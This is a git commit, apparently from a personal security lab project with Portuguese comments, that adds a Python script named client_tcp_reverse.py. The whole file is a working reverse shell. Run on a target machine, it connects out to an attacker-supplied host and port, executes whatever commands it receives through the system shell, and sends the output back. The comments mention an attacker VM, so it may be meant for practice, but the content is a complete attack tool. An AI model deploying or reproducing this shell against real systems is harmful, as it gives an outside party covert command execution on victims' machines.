6fa117f3ac05c7f9d0a6e35637d9a6bf6e8b8604
lucasfelz <lucasfelz@gmail.com>
2025-06-01 20:15:37 -0300

    adicionando servidor tcp

---
+++ client_tcp_reverse.py
@@ -0,0 +1,29 @@
+# client tcp a ser executado na máquina alvo
+import socket
+import subprocess
+import sys
+
+#endereço do servidor da VM atacante
+attacker_host = sys.argv[1]
+attacker_port = int(sys.argv[2])
+
+# Socket creating
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Client connecting
+client.connect((attacker_host, attacker_port))
+
+# Sending data
+while True:
+    client.send(b"\n[reversesehll]$ ")
+    command = client.recv(4096).decode().strip()
+    if command .lower() == "exit":
+        break
+    
+    try:
+        output = subprocess.check_output(command, shell = True, stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        output = e.output
+    client.send(output)
+
+client.close()
